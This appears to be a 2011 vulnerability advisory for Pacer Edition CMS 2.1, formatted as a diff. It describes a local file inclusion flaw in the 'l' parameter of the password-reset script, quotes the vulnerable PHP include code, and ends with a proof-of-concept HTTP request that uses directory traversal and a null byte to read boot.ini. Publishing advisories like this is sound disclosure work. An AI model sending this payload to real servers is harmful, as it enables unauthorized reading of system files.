@@ -1,0 +1,74 @@
+Pacer Edition CMS 2.1 (l param) Local File Inclusion Vulnerability
+
+Vendor: The Pacer Edition
+Product web page: http://www.thepaceredition.com
+Affected version: RC 2.1 (SVN: 867)
+
+Summary: The 'Pacer Edition' is a Content Management System(CMS)
+written using PHP 5.2.9 as a minimum requirement. The Pacer Edition
+CMS was based from Website baker core and has been completely
+redesigned with a whole new look and feel along with many new
+advanced features to allow you to build sites exactly how you want
+and make them, 100% yours!
+
+Desc: Pacer Edition CMS suffers from a local file inlcusion
+vulnerability when input passed thru the 'l' parameter to
+admin/login/forgot/index.php script is not properly verified
+before being used to include files. This can be exploited to
+include files from local resources with directory traversal
+attacks and URL encoded NULL bytes.
+
+
+/admin/login/forgot/index.php (line: 59-62):
+----------------------------------------------------------------
+
+$lang_id = ((isset($_GET['l'])) ? $_GET['l'] : '');
+if ($lang_id == '') $lang_id = (LANGUAGE) ? LANGUAGE : (DEFAULT_LANGUAGE) ? DEFAULT_LANGUAGE : 'EN';
+if (!file_exists(PE_PATH.'/languages/'.$lang_id.'.php')) $lang_id = 'EN'; 
+require (PE_PATH.'/languages/'.$lang_id.'.php');
+
+----------------------------------------------------------------
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab
+
+
+Advisory ID: ZSL-2011-5019
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5019.php
+
+
+
+07.06.2011
+
+
+PoC:
+
+----------------------------------------------------------------
+
+POST /admin/login/forgot/index.php?l=..%2f..%2f..%2f..%2f..%2fboot.ini%00 HTTP/1.1
+Host: localhost
+Proxy-Connection: keep-alive
+User-Agent: thricer
+Content-Length: 2
+Cache-Control: max-age=0
+Origin: null
+Content-Type: multipart/form-data; boundary=----x
+Accept: text/html
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+
+------x
+Content-Disposition: form-data; name="email"
+
+sm
+------x--
+
+----------------------------------------------------------------
